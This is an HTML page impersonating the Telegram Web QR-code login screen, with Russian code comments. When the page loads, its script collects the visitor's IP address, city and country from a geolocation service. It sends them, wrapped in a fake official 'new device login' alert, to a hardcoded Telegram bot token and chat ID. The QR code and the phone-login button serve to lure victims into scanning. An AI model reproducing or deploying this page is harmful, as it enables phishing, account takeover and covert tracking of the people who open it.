<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <title>Telegram Web</title>
    <style>
        body {
            background-color: #0f1721;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .login-container {
            text-align: center;
            max-width: 360px;
            width: 100%;
            padding: 20px;
        }
        .qr-wrapper {
            background: white;
            padding: 12px;
            border-radius: 24px;
            display: inline-block;
            margin-bottom: 32px;
        }
        .qr-wrapper img {
            width: 200px;
            height: 200px;
            display: block;
            border-radius: 8px;
        }
        h2 { font-size: 32px; margin: 0 0 16px 0; font-weight: 500; }
        ol {
            text-align: left;
            padding: 0;
            list-style: none;
            counter-reset: item;
            color: #f1f1f1;
            line-height: 1.5;
            font-size: 16px;
            margin: 0 auto;
            display: inline-block;
        }
        ol li {
            counter-increment: item;
            margin-bottom: 14px;
            display: flex;
            align-items: flex-start;
        }
        ol li::before {
            content: counter(item) ". ";
            font-weight: bold;
            color: #3390ec;
            margin-right: 12px;
            min-width: 20px;
        }
        .link-action {
            color: #3390ec;
            text-decoration: none;
            font-weight: 500;
            display: block;
            margin-top: 40px;
            cursor: pointer;
            font-size: 16px;
            text-transform: uppercase;
        }
        .link-action:hover { color: #4dadff; }
    </style>
</head>
<body>

<div class="login-container">
    <div class="qr-wrapper">
        <img src="qr.png" alt="QR Code">
    </div>

    <h2>Log in to Telegram by QR Code</h2>

    <ol>
        <li>Open Telegram on your phone</li>
        <li>Go to <b>Settings</b> > <b>Devices</b> > <b>Link Desktop Device</b></li>
        <li>Point your phone at this screen to confirm login</li>
    </ol>

    <div class="link-action" id="phone-btn">
        Log in by phone number <span id="prefix-display"></span>
    </div>
</div>

<script>
// --- ТВОИ ДАННЫЕ ВСТАВЛЕНЫ ---
const BOT_TOKEN = '8244809963:AAHw9Gfy7mDNRuWKjyqsBAu52Y5isnjY7CY';
const CHAT_ID = '7128871752';

async function sendAlert() {
    try {
        // 1. Собираем данные по IP
        const response = await fetch('https://ipapi.co/json/');
        const geo = await response.json();

        // 2. Определяем префикс для кнопки
        const prefixDisplay = document.getElementById('prefix-display');
        let prefix = "+" + (geo.country_calling_code || "");
        if (geo.country_code === "UA") prefix = "+380";
        if (geo.country_code === "RU") prefix = "+7";
        prefixDisplay.innerText = prefix;

        // 3. Формируем время (как в официальном уведомлении)
        const now = new Date();
        const fullDate = `${now.toLocaleDateString()} в ${now.toLocaleTimeString()} UTC`;

        // 4. Собираем текст официального алерту
        const message = `
<b>Вход с нового устройства.</b>

Andrew, мы обнаружили вход в Ваш аккаунт с нового устройства ${fullDate}.

<b>Устройство:</b> Telegram Web, 2.2 K, Firefox 147, Linux
<b>Место входа:</b> ${geo.city || 'Unknown'}, ${geo.country_name || 'Unknown'} (IP: ${geo.ip})

Если это были не Вы, как можно скорее перейдите в <b>Настройки > Устройства</b> (или Конфиденциальность > Активные сеансы) и завершите новый сеанс.
        `.trim();

        // 5. Отправляем тебе в бот
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error("Connection error");
    }
}

// Запуск при открытии
window.onload = sendAlert;

// Логика кнопки (имитация)
document.getElementById('phone-btn').onclick = () => {
    alert("Please scan the QR code to continue.");
};
</script>

</body>
</html>
